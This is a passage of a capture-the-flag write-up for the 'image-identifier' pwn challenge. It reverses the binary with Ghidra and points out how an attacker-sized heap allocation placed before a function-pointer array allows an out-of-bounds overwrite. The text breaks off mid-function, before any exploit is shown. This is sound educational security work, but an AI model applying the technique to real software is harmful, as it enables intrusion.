@@ -1,0 +1,637 @@
+I"�;<h1 id="intro">Intro</h1>
+
+<p>Heres the second one.</p>
+
+<h2 id="description">Description</h2>
+
+<p><img src="https://user-images.githubusercontent.com/73792438/125590627-6d60c007-9e4e-4a5d-9164-49e7fa3828e5.png" alt="image" /></p>
+
+<p>Oddly enough I solved this challenge before <code class="language-plaintext highlighter-rouge">simultaneity</code>, despite this having less solves overall, probably due to its complexity. The description would suggest some 
+sort of image parser (of course the name is <code class="language-plaintext highlighter-rouge">image-identifier</code>). So lets run it and see.</p>
+
+<p>We are given a <code class="language-plaintext highlighter-rouge">Dockerfile</code> and a binary, <code class="language-plaintext highlighter-rouge">chal</code>. No libc this time so no need for any patching shenanigans. If we run <code class="language-plaintext highlighter-rouge">checksec</code> (like i forgot for <code class="language-plaintext highlighter-rouge">simultaneity</code>) we 
+can see what our options will be:</p>
+
+<p><img src="https://user-images.githubusercontent.com/73792438/125593030-b4bd38d7-8651-4af7-9a87-cb552b662bfc.png" alt="image" /></p>
+
+<p>So PIE is off, and no libc is provided. That combined with having only Partial Relro means that the intended solution probably involves calling/overwriting some function
+in the binary/Global Offset Table. If we run the program:</p>
+
+<p><img src="https://user-images.githubusercontent.com/73792438/125593519-98e1de93-afd6-461e-83d1-5c52d68f1a82.png" alt="image" /></p>
+
+<p>We can see it asks for the size of our image file. Upon supplying a size we can then supply our image content. Supplying some junk, predictably does nothing but make the
+program complain about <code class="language-plaintext highlighter-rouge">unidentifiable format</code>, then exits. It seems we won’t be able to fully explore the program functionality unless we understand how to make an image
+with an identifiable format, so lets crack it open in ghidra.</p>
+
+<h1 id="reversing">Reversing</h1>
+
+<p>Thankfully the file isn’t stripped (its a pwn challenge, not rev thank god) so we can still maintain some semblence of sanity. So whats in <code class="language-plaintext highlighter-rouge">main()</code>? Quite alot when 
+compared to <code class="language-plaintext highlighter-rouge">simultaneity</code> (cant take a screenshot bcuz its too big, will just dump the code here):</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">retval</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">yes_no</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">image_length</span><span class="p">;</span>
+  <span class="n">undefined4</span> <span class="n">invert_image_colours</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">img_type</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">image_alloc</span><span class="p">;</span>
+  <span class="n">code</span> <span class="o">**</span><span class="n">image_fops</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">cookie</span><span class="p">;</span>
+  
+  <span class="n">cookie</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+                      <span class="cm">/* setup buffering for lil old me awww */</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"welcome to the image identifier service</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"How large is your file?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">retval</span> <span class="o">=</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">image_length</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                      <span class="cm">/* supposedly 'invalid' file size but doesn't bail out :) */</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"invalid file size"</span><span class="p">);</span>
+  <span class="p">}</span>
+                      <span class="cm">/* malloc will return '0' if it fails (aka, size too big). However this doesn't
+                         help us, AT ALL. */</span>
+  <span class="n">image_alloc</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span><span class="n">image_length</span><span class="p">);</span>
+  <span class="n">getchar</span><span class="p">();</span>
+  <span class="n">image_fops</span> <span class="o">=</span> <span class="p">(</span><span class="n">code</span> <span class="o">**</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"please send your image here:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">fread</span><span class="p">(</span><span class="n">image_alloc</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">image_length</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+                      <span class="cm">/* read from the start of our input/image to determine the type of image. From
+                         here different fops will be used for each image type. */</span>
+  <span class="n">img_type</span> <span class="o">=</span> <span class="n">validateHeader</span><span class="p">(</span><span class="n">image_alloc</span><span class="p">);</span>
+                      <span class="cm">/* No checks happen on the chunks/footer if we use bmp. Because the functions
+                         are basically nops LMFAO. :( just realised my dumbass didn't see that they
+                         just exit() immediately. */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">img_type</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">*</span><span class="n">image_fops</span> <span class="o">=</span> <span class="n">bmpHeadValidate</span><span class="p">;</span>
+    <span class="n">image_fops</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">bmpChunkValidate</span><span class="p">;</span>
+    <span class="n">image_fops</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">bmpFooterValidate</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">img_type</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"unidentifiable format"</span><span class="p">);</span>
+                      <span class="cm">/* WARNING: Subroutine does not return */</span>
+      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+                      <span class="cm">/* However if we have the mis-fortune to use png, there are a myriad of checks
+                         and fucky shit we have to do to get a valid file produced. */</span>
+    <span class="o">*</span><span class="n">image_fops</span> <span class="o">=</span> <span class="n">pngHeadValidate</span><span class="p">;</span>
+    <span class="n">image_fops</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">pngChunkValidate</span><span class="p">;</span>
+    <span class="n">image_fops</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">pngFooterValidate</span><span class="p">;</span>
+  <span class="p">}</span>
+                      <span class="cm">/* generates a 256 byte-long sequence */</span>
+  <span class="n">make_crc_table</span><span class="p">();</span>
+                      <span class="cm">/* ghidra fucked up the args. This will either be bmpHeadValidate() or
+                         pngHeadValidate(). */</span>
+  <span class="n">retval</span> <span class="o">=</span> <span class="p">(</span><span class="o">**</span><span class="n">image_fops</span><span class="p">)(</span><span class="n">image_alloc</span><span class="p">,</span><span class="n">image_length</span><span class="p">,</span><span class="n">image_length</span><span class="p">,</span><span class="o">*</span><span class="n">image_fops</span><span class="p">);</span>
+                      <span class="cm">/* if the above is sucessful, we can increment image_alloc by 33 bytes. If our
+                         allocation is smaller that that, we can write out of bounds n shit */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"valid header, processing chunks"</span><span class="p">);</span>
+                      <span class="cm">/* Offset can be added to quite a bit, and if your allocation is only 16
+                         bytes (minimum) this may be incremented out of bounds, and into the
+                         image_fops array... Interesting... */</span>
+    <span class="n">image_alloc</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">long</span><span class="p">)</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">offset</span><span class="p">);</span>
+    <span class="n">invert_image_colours</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"do you want to invert the colors?"</span><span class="p">);</span>
+    <span class="n">retval</span> <span class="o">=</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%c"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">yes_no</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">((</span><span class="n">retval</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">yes_no</span> <span class="o">==</span> <span class="sc">'y'</span><span class="p">))</span> <span class="p">{</span>
+      <span class="n">invert_image_colours</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">while</span> <span class="p">((</span><span class="n">ended</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="kt">long</span><span class="p">)</span><span class="n">image_alloc</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">image_fops</span><span class="p">)))</span> <span class="p">{</span>
+                      <span class="cm">/* until there are no chunks left to check. Also check that image_alloc doesn't
+                         get incremented out of bounds (but what if it already has been ;) ). */</span>
+      <span class="n">image_alloc</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="n">image_fops</span><span class="p">[</span><span class="mi">1</span><span class="p">])(</span><span class="n">image_alloc</span><span class="p">,</span><span class="n">invert_image_colours</span><span class="p">,</span><span class="n">invert_image_colours</span><span class="p">,</span>
+                                                   <span class="n">image_fops</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="p">}</span>
+    <span class="p">(</span><span class="o">*</span><span class="n">image_fops</span><span class="p">[</span><span class="mi">2</span><span class="p">])(</span><span class="n">image_alloc</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"congrats this is a great picture"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">cookie</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                      <span class="cm">/* WARNING: Subroutine does not return */</span>
+      <span class="n">__stack_chk_fail</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+                      <span class="cm">/* WARNING: Subroutine does not return */</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+
+
+</code></pre></div></div>
+
+<p>Lets go though this, step by step. First things first we setup the stack canary, disable buffering, and then we get our size</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">puts</span><span class="p">(</span><span class="s">"welcome to the image identifier service</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"How large is your file?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">retval</span> <span class="o">=</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">"%d"</span><span class="p">,</span><span class="o">&amp;</span><span class="n">image_length</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+                      <span class="cm">/* supposedly 'invalid' file size but doesn't bail out :) */</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"invalid file size"</span><span class="p">);</span>
+  <span class="p">}</span>
+                      <span class="cm">/* malloc will return '0' if it fails (aka, size too big). However this doesn't
+                       help us, AT ALL. */</span>
+  <span class="n">image_alloc</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span><span class="n">image_length</span><span class="p">);</span>
+  <span class="n">getchar</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>And pass it to <code class="language-plaintext highlighter-rouge">malloc((long)image_length)</code>. This means that we control the allocation size completely with our size. The smallest possible allocation we can supply is 
+16 (all chunks are at least this).</p>
+
+<p>Now we get to an interesting part. After our allocation is created, another subsequent allocation is created:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">image_fops</span> <span class="o">=</span> <span class="p">(</span><span class="n">code</span> <span class="o">**</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Ghidra rightly identified this as a pointer to a list of pointers. In particular <code class="language-plaintext highlighter-rouge">code</code>/function pointers. The size request of <code class="language-plaintext highlighter-rouge">0x18</code> would indicate 3 of these function
+pointers, and this is exacty right, as you will see. The position of this allocation being directly after our ‘image’ allocation will be particularly relevant later, 
+props if you can already guess why :).</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">puts</span><span class="p">(</span><span class="s">"please send your image here:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+  <span class="n">fread</span><span class="p">(</span><span class="n">image_alloc</span><span class="p">,(</span><span class="kt">long</span><span class="p">)</span><span class="n">image_length</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+                    <span class="cm">/* read from the start of our input/image to determine the type of image. From
+                       here different fops will be used for each image type. */</span>
+  <span class="n">img_type</span> <span class="o">=</span> <span class="n">validateHeader</span><span class="p">(</span><span class="n">image_alloc</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Now we can see the familiar dialogue for recieving an image over <code class="language-plaintext highlighter-rouge">stdin</code>. The program uses <code class="language-plaintext highlighter-rouge">fread()</code> for this which is pretty cool as regardless of how many badchars
+we send (carriage returns, newlines, etc) that would normally terminate a <code class="language-plaintext highlighter-rouge">scanf()</code> this will read until it has read <code class="language-plaintext highlighter-rouge">(long)image_length</code> bytes and wont stop until
+that point.</p>
+
+<p>We then send our now full input buffer to the function validateHeader.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">longlong</span> <span class="nf">validateHeader</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">image_alloc</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">memcmp_res</span><span class="p">;</span>
+  <span class="n">longlong</span> <span class="n">image_format</span><span class="p">;</span>
+  
+  <span class="n">memcmp_res</span> <span class="o">=</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">image_alloc</span><span class="p">,</span><span class="o">&amp;</span><span class="n">bmpHead</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span> <span class="c1">// if first 2 bytes match bmpHead (0x4D42)</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">memcmp_res</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">image_format</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">memcmp_res</span> <span class="o">=</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">image_alloc</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pngHead</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// or, if the first 8 match pngHead (0x0A1A0A0D474E5089)</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">memcmp_res</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">image_format</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">image_format</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">image_format</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>This simply compares the the first few bytes of our image to identify the format, comparing 2 header values <code class="language-plaintext highlighter-rouge">bmpHead</code> and <code class="language-plaintext highlighter-rouge">pngHead</code>. Whichever matches first will be 
+our format, or, if it finds nothing probably an <code class="language-plaintext highlighter-rouge">unidentifiable format</code>. Coming back into <code class="language-plaintext highlighter-rouge">main()</code> we can see that this is the case:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">if</span> <span class="p">(</span><span class="n">img_type</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="o">*</span><span class="n">image_fops</span> <span class="o">=</span> <span class="n">bmpHeadValidate</span><span class="p">;</span>
+    <span class="n">image_fops</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">bmpChunkValidate</span><span class="p">;</span>
+    <span class="n">image_fops</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">bmpFooterValidate</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">img_type</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"unidentifiable format"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+                    <span class="cm">/* However if we have the mis-fortune to use png, there are a myriad of checks
+                       and fucky shit we have to do to get a valid file produced. */</span>
+    <span class="o">*</span><span class="n">image_fops</span> <span class="o">=</span> <span class="n">pngHeadValidate</span><span class="p">;</span>
+    <span class="n">image_fops</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">pngChunkValidate</span><span class="p">;</span>
+    <span class="n">image_fops</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">pngFooterValidate</span><span class="p">;</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>You can see the <code class="language-plaintext highlighter-rouge">puts("unidentifiable format")</code> we got before. You can also see that our <code class="language-plaintext highlighter-rouge">image_fops</code> array of function pointers is being assigned some values based
+on the identified header. If <code class="language-plaintext highlighter-rouge">validateHeader()</code> though it was a bmp, we get a corresponding set of <code class="language-plaintext highlighter-rouge">Validate</code> function pointers for that format, same with png. If we
+didn’t match with any of the identifiable headers we simply exit; the point of this program is to identify images, no point going on if it cannot identify it.</p>
+
+<h2 id="crypto-pwn-really--_-">Crypto pwn, really -_-</h2>
+
+<p>Next we do something strange:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="cm">/* generates a 256 byte-long sequence */</span>
+  <span class="n">make_crc_table</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>And if we then look into this function:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">make_crc_table</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">uint</span> <span class="n">count_byte</span><span class="p">;</span>
+  <span class="n">uint</span> <span class="n">counter</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">counter2</span><span class="p">;</span>
+  
+                    <span class="cm">/* 256 bytes... */</span>
+  <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="n">counter</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">count_byte</span> <span class="o">=</span> <span class="n">counter</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">;</span>
+                    <span class="cm">/* for each bit of those bytes */</span>
+    <span class="n">counter2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">counter2</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">((</span><span class="n">count_byte</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">count_byte</span> <span class="o">=</span> <span class="n">count_byte</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+        <span class="n">count_byte</span> <span class="o">=</span> <span class="n">count_byte</span> <span class="o">&gt;&gt;</span> <span class="mi">1</span> <span class="o">^</span> <span class="mh">0xedb88320</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="n">counter2</span> <span class="o">=</span> <span class="n">counter2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+                    <span class="cm">/* write the result to the global var: 'crc_table' */</span>
+    <span class="o">*</span><span class="p">(</span><span class="n">uint</span> <span class="o">*</span><span class="p">)(</span><span class="n">crc_table</span> <span class="o">+</span> <span class="p">(</span><span class="kt">long</span><span class="p">)(</span><span class="kt">int</span><span class="p">)</span><span class="n">counter</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="n">count_byte</span><span class="p">;</span>
+    <span class="n">counter</span> <span class="o">=</span> <span class="n">counter</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Thats fine, my first reaction was “what the fuck?” too. But looking a bit deeper we see all it really does is shift + xor stuff and then assign the result, byte by
+byte to the global variable <code class="language-plaintext highlighter-rouge">crc_table</code> until we have assigned 0x100 bytes of garbage wierdness there. The name <code class="language-plaintext highlighter-rouge">crc_table</code> may sound familiar, Cyclic redundancy 
+check anyone? I’m not a crypto person, so I just looked it up on google</p>
+
+<p><img src="https://user-images.githubusercontent.com/73792438/125604657-55c1f918-3dcc-4dc0-a5bd-6882d26a8559.png" alt="image" /></p>
+
+<p>Don’t get too hung up on this, as its only used to ‘check’ our image header once, and is mostly to attach “check values” to each ‘chunk’ of our image (look at the 
+function names for <code class="language-plaintext highlighter-rouge">*ChunkValidate</code> function pointers). Specifically <code class="language-plaintext highlighter-rouge">make_crc_table</code> is responsible for creating a so called <code class="language-plaintext highlighter-rouge">generator polynomial</code></p>
+
+<p>`
+Specification of a CRC code requires definition of a so-called generator polynomial. 
+This polynomial becomes the divisor in a polynomial long division, which takes the 
+message as the dividend and in which the quotient is discarded and the remainder becomes the result.
+`</p>
+
+<p>You don’t need to care about this too much. Just know that this <code class="language-plaintext highlighter-rouge">crc_table</code> will be used, at some point later, along with some data from our image to generate a 
+“check value” for parts of our image which will then be appended to the end of each part.</p>
+
+<p>Thanks <a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check">wikipedia</a></p>
+
+<p>Okay so now we have that insanity out of the way we can move onto more reversing:</p>
+
+<h2 id="image-and-chunk-processing">Image and chunk processing</h2>
+
+<p>Right after <code class="language-plaintext highlighter-rouge">make_crc_table()</code>, we call into the first element of our function pointer list</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="cm">/* ghidra fucked up the args. This will either be bmpHeadValidate() or
+                       pngHeadValidate(). */</span>
+  <span class="n">retval</span> <span class="o">=</span> <span class="p">(</span><span class="o">**</span><span class="n">image_fops</span><span class="p">)(</span><span class="n">image_alloc</span><span class="p">,</span><span class="n">image_length</span><span class="p">,</span><span class="n">image_length</span><span class="p">,</span><span class="o">*</span><span class="n">image_fops</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>The comment basically says it all. So lets clean that up a bit</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="cm">/* ghidra fucked up the args. This will either be bmpHeadValidate() or
+                       pngHeadValidate(). */</span>
+  <span class="n">retval</span> <span class="o">=</span> <span class="p">(</span><span class="o">**</span><span class="n">image_fops</span><span class="p">)(</span><span class="n">image_alloc</span><span class="p">);</span>
+</code></pre></div></div>
+<p>If we look at the function definition of any of the <code class="language-plaintext highlighter-rouge">*HeadValidate</code> functions we see they both only take one or 2 args; the <code class="language-plaintext highlighter-rouge">image_alloc</code> and length. I guess 
+because this is more of an indirect call into a list of function pointers ghidra has some trouble identifying what exactly the arguments are, since from ghidra’s 
+perspective we could call any function. Anyway, lets look at what <em>could</em> be called here based on the value of our header, starting with <code class="language-plaintext highlighter-rouge">bmpHeadValidate()</code>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">bmpHeadValidate</span><span class="p">(</span><span class="kt">long</span> <span class="n">image_alloc</span><span class="p">,</span><span class="n">uint</span> <span class="n">size</span><span class="p">)</span>
+
+<span class="p">{</span>
+                    <span class="cm">/* alot simpler than the checks on the png header; no CRC stuff, just checks 3
+                       bytes (?) of the header to verify. */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">size</span> <span class="o">!=</span> <span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mh">0x18</span> <span class="o">|</span>
+              <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span> <span class="o">|</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">|</span>
+              <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mh">0x10</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"invalid size!"</span><span class="p">);</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So this actually takes <em>2</em> args, rather than pngHeadValidate which takes only 1. This is effectively just a call to <code class="language-plaintext highlighter-rouge">exit(1)</code> if you provide an incorrect bmp size, 
+which for this bmp format is at byte+3 to 6 (remember the bmp header thingy is only 2 bytes). But if you do provide a correct size we return nothing, so this function
+is for all intensive purposes a <code class="language-plaintext highlighter-rouge">nop</code>. This is the case for all the bmp functions; the others just havent been implemented in the program and just exit when called.
+So its fairly clear that we sould focus on the png functions instead:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">pngHeadValidate</span><span class="p">(</span><span class="kt">long</span> <span class="n">image_alloc</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="n">uint</span> <span class="n">PNG_header</span><span class="p">;</span>
+  <span class="n">undefined8</span> <span class="n">bad_header</span><span class="p">;</span>
+  
+  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mh">0xb</span><span class="p">)</span> <span class="o">==</span> <span class="sc">'\r'</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="cm">/* if image_alloc+0xb == '\r' we can increment offset by 33 in total :))) */</span>
+    <span class="n">offset</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">;</span>
+                    <span class="cm">/* Generate a checksum for the next 0x11 bytes of our file.
+                        */</span>
+    <span class="n">PNG_header</span> <span class="o">=</span> <span class="n">update_crc</span><span class="p">(</span><span class="n">image_alloc</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">,</span><span class="mh">0x11</span><span class="p">);</span>
